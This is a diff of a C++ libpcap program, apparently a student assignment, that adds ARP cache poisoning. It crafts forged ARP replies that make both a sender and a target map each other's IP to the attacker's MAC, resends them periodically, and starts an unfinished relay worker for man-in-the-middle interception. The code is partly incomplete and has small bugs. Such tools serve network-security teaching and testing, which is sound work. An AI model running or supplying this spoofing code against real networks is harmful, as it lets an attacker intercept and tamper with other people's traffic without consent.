@@ -29,8 +29,53 @@ struct EthArpPacket final {
 	EthHdr eth_;
 	ArpHdr arp_;
 };
-#pragma pack(pop)
 
+// my ipv4 header from pcap-test assginment.
+typedef struct eIpv4Hdr_{
+#if BYTE_ORDER == LITTLE_ENDIAN
+	u_char IHL:4;
+	u_char VER:4;
+#else
+	u_char VER:4;
+	u_char IHL:4;
+#endif
+	uint8_t DSCP_ECN;
+	uint16_t TOTAL_LEN;
+	uint16_t ID;
+	uint16_t FLAG_FRAGOFFSET;
+	uint8_t TTL;
+	uint8_t PROTOCOL;
+	uint16_t HDR_CHKSUM;
+	uint32_t SRC_IP_ADDR;
+	uint32_t DST_IP_ADDR;
+}eIpv4Hdr;
+
+// my tcp header from pcap-test assginment.
+typedef struct eTcpHdr_{
+	uint16_t SRC_PORT;
+	uint16_t DST_PORT;
+	uint32_t SEQ_NUM;
+	uint32_t ACK_NUM;
+#if BYTE_ORDER == LITTLE_ENDIAN
+	u_char FLAGS_RESERVED_NS:4;
+	u_char DATA_OFFSET:4;
+#else
+	u_char DATA_OFFSET:4;
+	u_char FLAGS_RESERVED_NS:4;
+#endif
+	uint8_t FLAGS_ETC:4;
+	uint16_t WIN_SIZE;
+	uint16_t CHKSUM;
+	uint16_t URG_PTR;
+}eTcpHdr;
+
+// Eth && Ipv4 && Tcp packet structure.
+struct eEthIpv4TcpPacket{
+	EthHdr eth_;
+	eIpv4Hdr eIpv4Hdr_;
+	eTcpHdr eTcpHdr_;
+};
+#pragma pack(pop)
 
 
 void usage();
@@ -39,7 +84,8 @@ Mac GetTargetMac(const char* deviceName_, Mac myMac_, Ip myIp_);
 Ip GetMyIp(std::string deviceName_);
 
 
-void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_, std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
+void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
+ std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
@@ -82,7 +128,8 @@ g_mutex_resolveMac.unlock();
 }
 
 
-void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_, std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
+void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
+ std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
@@ -142,151 +189,139 @@ g_mutex_resolveMac.unlock();
 }
 
 
-void SpoofWorker(const char* deviceName_, Mac MyMac_, Ip SenderIp_, Mac SenderMac_, Ip TargetIp_, Mac TargetMac_){
+void SpoofWorker(const char* deviceName_, Mac MyMac_,
+ std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
+ std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_,
+ int period_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
+		fprintf(stderr, "@SpoofWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
 		return;
 	}
 	
-	int cnt = 0;
+	if (!(SenderIpList_.size() == SenderMacList_.size()
+	 && SenderMacList_.size() == TargetIpList_.size()
+	 && TargetIpList_.size() == TargetMacList_.size())){
+		fprintf(stderr, "@SpoofWorker: lise size error\n");
+		return;
+	}
+	const size_t listSize = SenderIpList_.size();
+
+	// sender <-> me.
+	std::vector<EthArpPacket> pktArpRepInfectSenderList;
+	for(int i = 0; i < listSize; i++){
+		EthArpPacket pkt;
+		pkt.eth_.smac_ = MyMac_;
+		pkt.eth_.dmac_ = SenderMacList_.at(i);
+		pkt.eth_.type_ = htons(EthHdr::Arp);
+		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
+		pkt.arp_.pro_ = htons(EthHdr::Ip4);
+		pkt.arp_.hln_ = Mac::SIZE;
+		pkt.arp_.pln_ = Ip::SIZE;
+		pkt.arp_.op_ = htons(ArpHdr::Reply);
+		pkt.arp_.smac_ = MyMac_;
+		pkt.arp_.sip_ = htonl(TargetIpList_.at(i));
+		pkt.arp_.tmac_ = SenderMacList_.at(i);
+		pkt.arp_.tip_ = htonl(SenderIpList_.at(i));
+
+		pktArpRepInfectSenderList.push_back(pkt);
+	}
+
+	// target <-> me.
+	std::vector<EthArpPacket> pktArpRepInfectTargetList;
+	for(int i = 0; i < listSize; i++){
+		EthArpPacket pkt;
+		pkt.eth_.smac_ = MyMac_;
+		pkt.eth_.dmac_ = TargetMacList_.at(i);
+		pkt.eth_.type_ = htons(EthHdr::Arp);
+		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
+		pkt.arp_.pro_ = htons(EthHdr::Ip4);
+		pkt.arp_.hln_ = Mac::SIZE;
+		pkt.arp_.pln_ = Ip::SIZE;
+		pkt.arp_.op_ = htons(ArpHdr::Reply);
+		pkt.arp_.smac_ = MyMac_;
+		pkt.arp_.sip_ = htonl(SenderIpList_.at(i));
+		pkt.arp_.tmac_ = TargetMacList_.at(i);
+		pkt.arp_.tip_ = htonl(TargetIpList_.at(i));
+
+		pktArpRepInfectTargetList.push_back(pkt);
+	}
+
+	// stupid method.
 	int res = 0;
-	struct pcap_pkthdr* header;
-	printf("SenderIp_=%s\nSenderMac_=%s\nTargetIp_=%s\nTargetMac_=%s\n",
-		std::string(SenderIp_).c_str(), std::string(SenderMac_).c_str(),
-		std::string(TargetIp_).c_str(), std::string(TargetMac_).c_str()
-	);
 	while (true)
 	{
-		usleep(100000);
+		sleep(period_);
+		for(int i = 0; i < listSize; i++){
+			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepInfectSenderList.at(i))), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				return;
+			}
+			printf("%s -> %s\n", std::string(pktArpRepInfectSenderList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectSenderList.at(i).eth_.dmac()).c_str());
 
-		/*
-		// receive packet.
-		const u_char* rawArpReq;
-		res = pcap_next_ex(handle, &header, &rawArpReq);
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-			return;
+			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				return;
+			}
+			printf("%s -> %s\n", std::string(pktArpRepInfectTargetList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectTargetList.at(i).eth_.dmac()).c_str());
 		}
-
-		if (res == 0){
-			// no captured packet.
-			continue;
-		}
-
-		EthArpPacket* pktArpReq = (EthArpPacket*)rawArpReq;
-		if (pktArpReq->eth_.type() != EthHdr::Arp){
-			continue;
-		}
-		if (pktArpReq->arp_.op() != ArpHdr::Request){
-			continue;
-		}
-		*/
-		// send infect arp rep.
-		// SenderIp_
-
-		/*
-		EthArpPacket pktArpRepInfect;
-		pktArpRepInfect.eth_.smac_ = MyMac_;
-		pktArpRepInfect.eth_.dmac_ = pktArpReq->eth_.smac_;
-		pktArpRepInfect.eth_.type_ = htons(EthHdr::Arp);
-		pktArpRepInfect.arp_.hrd_ = htons(ArpHdr::ETHER);
-		pktArpRepInfect.arp_.pro_ = htons(EthHdr::Ip4);
-		pktArpRepInfect.arp_.hln_ = Mac::SIZE;
-		pktArpRepInfect.arp_.pln_ = Ip::SIZE;
-		pktArpRepInfect.arp_.op_ = htons(ArpHdr::Reply);
-		pktArpRepInfect.arp_.smac_ = MyMac_;
-		pktArpRepInfect.arp_.sip_ = pktArpReq->arp_.tip_;
-		pktArpRepInfect.arp_.tmac_ = pktArpReq->eth_.smac_;
-		pktArpRepInfect.arp_.tip_ = pktArpReq->arp_.sip_;
-		*/
-		EthArpPacket pktArpRepInfect;
-		pktArpRepInfect.eth_.smac_ = MyMac_;
-		pktArpRepInfect.eth_.dmac_ = SenderMac_;
-		pktArpRepInfect.eth_.type_ = htons(EthHdr::Arp);
-		pktArpRepInfect.arp_.hrd_ = htons(ArpHdr::ETHER);
-		pktArpRepInfect.arp_.pro_ = htons(EthHdr::Ip4);
-		pktArpRepInfect.arp_.hln_ = Mac::SIZE;
-		pktArpRepInfect.arp_.pln_ = Ip::SIZE;
-		pktArpRepInfect.arp_.op_ = htons(ArpHdr::Reply);
-		pktArpRepInfect.arp_.smac_ = MyMac_;
-		pktArpRepInfect.arp_.sip_ = htonl(TargetIp_);
-		pktArpRepInfect.arp_.tmac_ = SenderMac_;
-		pktArpRepInfect.arp_.tip_ = htonl(SenderIp_);
-
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfect), sizeof(EthArpPacket));
-		if (res != 0) {
-			fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-			return;
-		}
-
-		/*
-		printf("####### CAPTURED\n");
-		if (!((Mac(pktArpReq->eth_.smac_) == SenderMac_)
-			&& (Mac(pktArpReq->eth_.dmac_) == MyMac_ || Mac(pktArpReq->eth_.dmac_) == Mac().broadcastMac())
-			&& (Mac(pktArpReq->arp_.smac_) == SenderMac_)
-			&& (Ip(pktArpReq->arp_.sip_) == SenderIp_)
-			&& (Mac(pktArpReq->arp_.tmac_) == Mac().nullMac())
-			&& (Ip(pktArpReq->arp_.tip_) == TargetIp_)))
-		{	// 강의노트 9p 1번만 캡처. 단, 브로드캐스트되는 패킷 말고도 나한테 유니캐스트 되는 패킷도 캡처. 아니라면 continue.
-			continue;
-		}
-		*/
-
 	}
 	return;
 }
 
 
-void RelayWorker(const char* deviceName_, Mac MyMac_, Ip SenderIp_, Mac SenderMac_, Ip TargetIp_, Mac TargetMac_){
+void RelayWorker(const char* deviceName_, Mac MyMac_,
+ std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
+ std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
+		fprintf(stderr, "@RelayWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
 		return;
 	}
+	
+	if (!(SenderIpList_.size() == SenderMacList_.size()
+	 && SenderMacList_.size() == TargetIpList_.size()
+	 && TargetIpList_.size() == TargetMacList_.size())){
+		fprintf(stderr, "@RelayWorker: list size error\n");
+		return;
+	}
+	const size_t listSize = SenderIpList_.size();
 
-	int cnt = 0;
 	int res = 0;
 	struct pcap_pkthdr* header;
 	while (true)
 	{
 		sleep(0);
-
 		const u_char* rawRecv;
 		res = pcap_next_ex(handle, &header, &rawRecv);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			printf("@RelayWorker: pcap_next_ex error=%s\n", res, pcap_geterr(handle));
 			return;
 		}
 
-		EthArpPacket* pktRecv = (EthArpPacket*)rawRecv;
-		rawRecv
-
-
-
-		EthArpPacket pktArpReq;
-		pktArpReq.eth_.smac_ = MyMac_;
-		pktArpReq.eth_.dmac_ = Mac().broadcastMac();
-		pktArpReq.eth_.type_ = htons(EthHdr::Arp);
-		pktArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
-		pktArpReq.arp_.pro_ = htons(EthHdr::Ip4);
-		pktArpReq.arp_.hln_ = Mac::SIZE;
-		pktArpReq.arp_.pln_ = Ip::SIZE;
-		pktArpReq.arp_.op_ = htons(ArpHdr::Request);
-		pktArpReq.arp_.smac_ = MyMac_;
-		pktArpReq.arp_.sip_ = htonl(GetMyIp(deviceName_));	// I can use custom ip.
-		pktArpReq.arp_.tmac_ = Mac().nullMac();
-		pktArpReq.arp_.tip_ = htonl(IpList_.at(cnt++ % IpList_.size()));
-
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpReq), sizeof(EthArpPacket));
-		if (res != 0) {
-			fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-			return;
+		EthHdr* ethHdr = (EthHdr*)rawRecv;
+		if (ethHdr->type_ == EthHdr::Ip4){
+			// capture Ipv4.
 		}
+		else if (ethHdr->type_ == EthHdr::Ip6){
+			// drop Ipv6.
+			continue;
+		}
+		else if (ethHdr->type_ == EthHdr::Arp){
+			// drop ARP.
+			continue;
+		}
+
+		
+		
+		const uint32_t pktSize = header->caplen;
+
+		
 	}
-g_mutex_resolveMac.unlock();
 	return;
 }
 
@@ -313,8 +348,6 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't get my mac address\n");
 		return -1;
 	}
-
-
 
 
 	// count jobs.
@@ -363,19 +396,8 @@ int main(int argc, char* argv[]) {
 		std::cout << std::string(targetMacList.at(_)) << std::endl;
 	}
 
-	printf("@@\n");
-
-	std::thread SpoofThread1(SpoofWorker, dev, MyMac, senderIpList[0], senderMacList[0], targetIpList[0], targetMacList[0]);
-	std::thread SpoofThread2(SpoofWorker, dev, MyMac, targetIpList[0], targetMacList[0], senderIpList[0], senderMacList[0]);
-
-	
-	std::thread RelayThread(RelayWorker, dev, MyMac, targetIpList[0], targetMacList[0], senderIpList[0], senderMacList[0]);
-
-
-
-
-	SpoofThread1.join();
-	SpoofThread2.join();
+	std::thread SpoofThread(SpoofWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 1);
+	SpoofThread.join();
 	printf("@@\n");
 	
 
